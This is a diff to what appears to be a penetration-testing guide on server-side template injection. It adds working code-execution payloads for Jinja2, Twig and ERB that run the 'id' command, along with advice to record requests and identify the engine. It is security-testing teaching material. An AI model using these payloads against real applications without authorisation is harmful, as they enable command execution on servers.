@@ -28,6 +28,14 @@ These are leads, not engine names. For example, `{{7*'7'}}` can render `7777777`
 
 ## After evaluation
 
-Record the input location, raw request, response, and where the result appeared. Check error messages and application files for the engine and version. Then use that engine's syntax and available objects for a small manual proof. The [quick reference](../02-foothold.md#server-side-template-injection-ssti) keeps a few engine-specific examples; none works for every template or sandbox.
+Record the input location, raw request, response, and where the result appeared. Check error messages and application files for the engine and version. Then use that engine's syntax and available objects for a small manual proof.
+
+```text
+Jinja2: {{ cycler.__init__.__globals__.os.popen('id').read() }}
+Twig:   {{ ['id']|filter('system') }}
+ERB:    <%= `id` %>
+```
+
+These are engine-specific examples, not interchangeable payloads. A sandbox or restricted template context may block them.
 
 [OWASP SSTI testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection/18-Server-side_Template_Injection) · [PortSwigger's engine comparison](https://portswigger.net/web-security/server-side-template-injection)
